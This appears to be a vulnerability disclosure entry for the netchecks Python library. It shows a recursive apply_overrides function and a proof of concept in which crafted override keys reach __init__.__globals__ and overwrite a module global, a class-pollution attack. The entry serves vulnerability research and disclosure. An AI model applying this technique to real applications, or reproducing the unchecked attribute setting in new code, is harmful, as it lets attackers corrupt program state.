## netchecks

### Meta

+ Library: netchecks
+ Stars: 157
+ Version: v0.5.4
+ CVE: N/A
+ Status: Pending
+ Payload: ```apply_overrides(dst_obj, {'__init__': {'__globals__': {'V1PodTemplateSpec': 'polluted'}}})```
+ Foundby: redacted
+ Report: Pending
+ Type: App
+ Exploitability: Low
+ Input: Func

### Library

https://github.com/hardbyte/netchecks

### Vulnerable Code Snippet

```python
def apply_overrides(template, overrides: dict):
    # This is a bit of a hack to apply overrides to the pod template
    def _apply_overrides(obj, overrides: dict):
        for k, v in overrides.items():
            key = k
            # k will be in camelCase (as it appears in Kubernetes manifests e.g., serviceAccountName)
            if hasattr(obj, "attribute_map"):
                # reverse the dict obj.attribute_map because the kubernetes python client
                # expects attributes named with snake_case.
                reverse_map = {v: k for k, v in obj.attribute_map.items()}
                key = reverse_map.get(k, k)

            if hasattr(obj, key):
                if getattr(obj, key) is None:
                    setattr(obj, key, {})
                if isinstance(v, dict):
                    _apply_overrides(getattr(obj, key), v)
                else:
                    setattr(obj, key, v)
            else:
                try:
                    obj[key] = v
                except TypeError:
                    setattr(obj, key, v)

    _apply_overrides(template, overrides)
    return template
```
### PoC

```python
from netchecks_operator.main import *
from kubernetes import client
labels = get_common_labels("test")
container = client.V1Container(
    name="netcheck",
    image=f"{settings.probe.image.repository}:{settings.probe.image.tag}",
    image_pull_policy=settings.probe.image.pullPolicy,
    env=[
    ],
)
pod_template = client.V1PodTemplateSpec(
    metadata=client.V1ObjectMeta(annotations=settings.probe.podAnnotations),
    spec=client.V1PodSpec(
        restart_policy="Never",
        containers=[container],
    ),
)
dst_obj = pod_template
apply_overrides(dst_obj, {'__init__': {'__globals__': {'V1PodTemplateSpec': 'polluted'}}})
print(dst_obj.__init__.__globals__["V1PodTemplateSpec"])
```